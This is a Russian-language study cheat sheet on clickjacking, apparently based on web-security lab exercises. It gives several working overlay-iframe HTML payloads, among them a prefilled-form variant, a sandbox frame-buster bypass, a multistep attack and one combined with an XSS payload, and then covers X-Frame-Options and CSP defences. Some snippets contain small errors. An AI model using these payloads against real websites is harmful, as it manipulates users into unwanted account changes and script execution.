* [Кликджекинг с предварительно заполненными данными формы](#Кликджекинг-с-предварительно-заполненными-данными-формы)
* [Скрипты блокировки фреймов](#Скрипты-блокировки-фреймов)
* [Сочетание с DOM XSS](#Сочетание-с-DOM-XSS)
* [МногоходовОчка](#МногоходовОчка)
* [Защита](#Защита)
	* [X-Frame-Options](#X-Frame-Options)
	* [Политика безопасности контента (CSP)](#Политика-безопасности-контента-(CSP))
* [Основные директивы CSP](#Основные-директивы-CSP)
* [URL](#URL)

> При атаке кликджекинга пользователя обманным путём заставляют нажать на элемент веб-страницы, который либо невидим, либо замаскирован под другой элемент. Эта манипуляция может привести к непредвиденным последствиям для пользователя, таким как загрузка вредоносного ПО, перенаправление на вредоносные веб-страницы, предоставление учётных данных или конфиденциальной информации, денежные переводы или онлайн-покупка товаров.
```
<style>
    iframe {
        position:relative;
        width:600;
        height: 600;
        opacity: 00000.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:560;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https:/victim.net/my-account"></iframe>
```
> Атаки Clickjacking не защищаются CSRF-токеном, поскольку целевой сеанс устанавливается с загрузкой контента с подлинного веб-сайта, и все запросы выполняются внутри домена.


# **Кликджекинг с предварительно заполненными данными формы**

* Некоторые веб-сайты, требующие заполнения и отправки форм, позволяют предварительно заполнять поля формы с помощью GET-параметров перед отправкой. Другие веб-сайты могут требовать текст перед отправкой формы. Поскольку значения GET являются частью URL-адреса, целевой URL-адрес может быть изменен для включения значений.

```
<style>
    iframe {
        position:relative;
        width:600;
        height: 600;
        opacity: 00000.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https:/victim.net/my-account?email=test%40test.test"></iframe>
```
# **Скрипты блокировки фреймов**

* Методы блокировки фреймов часто зависят от браузера и платформы
    * проверять и обеспечивать, чтобы текущее окно приложения было главным или верхним окном,
    * делать все фреймы видимыми,
    * предотвращать нажатия на невидимые фреймы,
    * перехватывать и сообщать пользователю о потенциальных атаках кликджекинга.
```
<style>
    iframe {
        position:relative;
        width:600;
        height: 600;
        opacity: 00000.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe id="victim_website" src="https://0a9b00b4046e1b2a82d8476500ab00db.web-security-academy.net/my-account/?email=adaa@asdf.ru" sandbox="allow-forms"></iframe>
```
> Эффективным способом борьбы с блокировками фреймов является использование атрибута HTML5 iframe sandbox. Если это задано с помощью значений allow-forms или allow-scripts, а значение allow-top-navigation опущено, то скрипт блокировки фреймов можно нейтрализовать, поскольку iframe не может проверить, является ли он верхним окном.

> Значения allow-forms и allow-scripts разрешают указанные действия внутри iframe. Это блокирует блокировку фреймов, но позволяет использовать функциональность на целевом сайте.

# **Сочетание с DOM XSS**

```
<style>
	iframe {
		position:relative;
        width: 600;
        height: 800;
        opacity: 00000.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:720;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe
src="https://victim.net/feedback?name=<img src=1 onerror=confirm('Mzfka?')>&email=pzdcyahacker@josko.com&subject=test&message=test#feedbackResult"></iframe>
```

# **МногоходовОчка**
```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 800px;
       opacity: 0.1;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:500px;
       left:60px;
       z-index: 1;
   }
   .secondClick {
       top:300px;
       left:210px; 
   }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://victim.net/my-account"></iframe>
```

# **Защита**

## **X-Frame-Options**

* X-Frame-Options: deny - предоставляет контроль над использованием iframe-ов или объектов, позволяя запретить включение веб-страницы во фрейм.
* X-Frame-Options: sameorigin - ограничить тем же источником, что и веб-сайт или указанным веб-сайтом с помощью директивы allow-from.

## **Политика безопасности контента (CSP)**

* Content-Security-Policy: policy; policy
    * policy — это строка директив политики
      
* Рекомендуемая защита от кликджекинга
  *	frame-ancestors 'none' - аналогична директиве X-Frame-Options deny.
  *	frame-ancestors 'self' - эквивалентна директиве X-Frame-Options sameorigin.
  *	Content-Security-Policy: frame-ancestors 'self' - добавляет в белый список фреймы только для одного домена.

# **Основные директивы CSP**

|Директива|Пример|Описание|
|--------------|-------------------|---------------|
|script-src|Content-Security-Policy: script-src 'self'|Определяет, откуда можно загружать и выполнять JavaScript|
|unsafe-inline|| Разрешает выполнение инлайновых скриптов (не рекомендуется, так как увеличивает риск XSS)|
|unsafe-eval||Разрешает использование eval() и аналогичных функций, что также увеличивает риск|
|style-src| Content-Security-Policy: style-src 'self'|Определяет источники для CSS стилей|
|img-src|Content-Security-Policy: img-src 'self'|Определяет источники для изображения|
|media-src|Content-Security-Policy: media-src 'self'|Определяет источники для аудио и видео файлов|
|font-src|Content-Security-Policy: font-src 'self'|Определяет источники для веб-шрифтов|
|object-src|Content-Security-Policy: object-src 'none'|Определяет источники для объектов, таких как плагины и встроенные контенты (например, <object>, <embed>, <applet>)|
|connect-src|Content-Security-Policy: connect-src 'self'|Определяет, к каким урлам можно отправлять запросы (например, через fetch, XHR, WebSocket)|
|frame-src|Content-Security-Policy: frame-src 'self'|Определяет источники, из которых можно загружать фреймы (<iframe>)|
|default-src|Content-Security-Policy: default-src 'self'|Определяет "базовый" источник для всех типов ресурсов, если не указаны более конкретные директивы|
|report-uri|Content-Security-Policy: report-uri /csp-violation-report-endpoint/|Указывает урл для отправки отчетов о нарушениях CSP|
|upgrade-insecure-requests|Content-Security-Policy: upgrade-insecure-requests|Принудительно преобразует все незащищенные запросы (HTTP) в защищенные (HTTPS)|
 
# URL
* https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP
* https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy#directives
